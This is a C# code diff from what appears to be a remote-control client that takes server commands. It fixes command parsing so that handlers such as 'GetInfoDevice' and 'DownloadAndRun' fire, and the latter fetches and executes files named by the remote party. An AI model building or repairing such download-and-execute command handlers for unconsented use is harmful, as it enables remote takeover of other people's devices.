@@ -19,12 +19,12 @@ namespace ClientWorker
 
         public void Analysis(string answer)
         {
-            string text = answer.Split('_')[0];
-            List<string> list = new List<string>();
-            list.AddRange(answer.Split('_'));
-            list.Remove(text);
+            string head = answer.Split('_')[0];
+            List<string> parametrs = new List<string>();
+            parametrs.AddRange(answer.Split('_'));
+            parametrs.Remove(head);
 
-            switch (answer)
+            switch (head)
             {
                 case "GetInfoDevice":
                    SendInfoDevice();
@@ -37,7 +37,7 @@ namespace ClientWorker
                     break;
 
                 case "DownloadAndRun":
-                    foreach (string prm in list)
+                    foreach (string prm in parametrs)
                     {
                        FileManager.GetFileAndRun(prm);
                     }
